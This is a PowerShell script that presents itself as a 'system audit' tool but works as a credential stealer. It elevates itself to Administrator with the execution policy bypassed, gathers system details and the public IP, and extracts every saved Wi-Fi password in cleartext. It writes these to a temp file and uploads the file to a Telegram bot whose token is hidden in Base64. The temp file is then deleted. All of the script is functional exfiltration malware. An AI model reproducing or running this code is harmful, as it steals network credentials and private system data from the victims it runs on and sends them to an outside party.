# ========== CONFIG ==========
$VerboseMode = $true
$Version = "2.0.0"

# ========== EXFILTRATION CONFIG (Base64) ==========
# Telegram
$BotToken_B64 = "ODAzMTQzNTU3NjpBQUV4SnkwQ1JkdHlFR3lpbl9iNjRUMDlPZmpIai1HOFUycw=="
$ChatID_B64 = "MTg0OTI2OTcwOA=="

# Discord (Optional - placeholder if you want to add it)
$DiscordWebhook_B64 = "" 

# Decode at runtime
$BotToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($BotToken_B64))
$ChatID = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ChatID_B64))
$DiscordWebhook = if ($DiscordWebhook_B64) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($DiscordWebhook_B64)) } else { $null }

# Telegram endpoint
$SendDocURL = "https://api.telegram.org/bot$BotToken/sendDocument"

# ========== ADMIN CHECK ==========
function Check-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-Log "Relaunching as Administrator..."
        Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
        exit 1
    }
}

# ========== LOG FUNCTION ==========
function Write-Log { param([string]$Message, [string]$Color = "Cyan"); if ($VerboseMode) { Write-Host "[*] $Message" -ForegroundColor $Color } }

# ========== GATHER SYSTEM INFO ==========
function Get-SystemInfo {
    Write-Log "Gathering System Information..."
    $cs = Get-CimInstance Win32_ComputerSystem
    $os = Get-CimInstance Win32_OperatingSystem
    $cpu = Get-CimInstance Win32_Processor
    $gpu = Get-CimInstance Win32_VideoController
    $mem = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
    
    $publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" }
    
    $info = [PSCustomObject]@{
        ComputerName = $env:COMPUTERNAME
        Model        = $cs.Model
        Manufacturer = $cs.Manufacturer
        OS           = $os.Caption
        OSVersion    = $os.Version
        CPU          = $cpu.Name
        Cores        = $cpu.NumberOfCores
        RAM_GB       = [Math]::Round($mem.Sum / 1GB, 2)
        GPU          = $gpu.Name
        PublicIP     = $publicIp
        Timestamp    = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        ToolVersion  = $Version
    }
    return $info
}

# ========== EXTRACT WIFI PASSWORDS ==========
function Get-WifiPasswords {
    Write-Log "Extracting WiFi Passwords..."
    $profiles = netsh wlan show profiles 2>$null |
        Select-String "All User Profile" |
        ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique

    $results = @()
    foreach ($p in $profiles) {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
        $keyLine = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
        if (-not $keyLine) { $keyLine = "<No password saved or open network>" }
        $results += [PSCustomObject]@{
            SSID     = $p
            Password = $keyLine
        }
    }
    return $results
}

# ========== FORMAT REPORT ==========
function Build-Report {
    param($SysInfo, $WifiData)
    
    $report = @"
=========================================
      SQD5-DCWH SYSTEM AUDIT REPORT
=========================================
SYSTEM INFORMATION:
-----------------------------------------
Computer Name : $($SysInfo.ComputerName)
Model         : $($SysInfo.Model)
Manufacturer  : $($SysInfo.Manufacturer)
OS            : $($SysInfo.OS) ($($SysInfo.OSVersion))
CPU           : $($SysInfo.CPU)
Cores         : $($SysInfo.Cores)
RAM           : $($SysInfo.RAM_GB) GB
GPU           : $($SysInfo.GPU)
Public IP     : $($SysInfo.PublicIP)
Timestamp     : $($SysInfo.Timestamp)
Tool Version  : $($SysInfo.ToolVersion)

WIFI PASSWORDS:
-----------------------------------------
"@
    foreach ($w in $WifiData) {
        $report += "`nSSID: $($w.SSID)`nPASS: $($w.Password)`n-----------------------------------------"
    }
    
    $report += "`n`n[END OF REPORT]"
    return $report
}

# ========== EXFILTRATION ==========
function Send-ToTelegram {
    param($FilePath, $FileName)
    Write-Log "Sending report to Telegram..."
    try {
        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

        $body = "--$boundary$LF"
        $body += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatID$LF"
        $body += "--$boundary$LF"
        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$FileName`"$LF"
        $body += "Content-Type: text/plain$LF$LF"

        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
        $endBytes = [Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")
        $payload = $bodyBytes + $fileBytes + $endBytes

        $wc = New-Object Net.WebClient
        $wc.Headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
        $wc.UploadData($SendDocURL, "POST", $payload) | Out-Null
        Write-Log "Sent successfully!" "Green"
    }
    catch {
        Write-Log "Failed to send to Telegram: $($_.Exception.Message)" "Red"
    }
}

# ========== MAIN EXECUTION ==========
Check-Admin

$SysInfo = Get-SystemInfo
$WifiData = Get-WifiPasswords
$FullReport = Build-Report -SysInfo $SysInfo -WifiData $WifiData

# Create Temp File
$fileName = "$($SysInfo.ComputerName)_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$tempFile = Join-Path $env:TEMP $fileName
$FullReport | Out-File -FilePath $tempFile -Encoding UTF8

# Send Data
Send-ToTelegram -FilePath $tempFile -FileName $fileName

# Cleanup
if (Test-Path $tempFile) { 
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue 
    Write-Log "Cleanup complete." "Gray"
}

Write-Log "Process Finished." "Green"
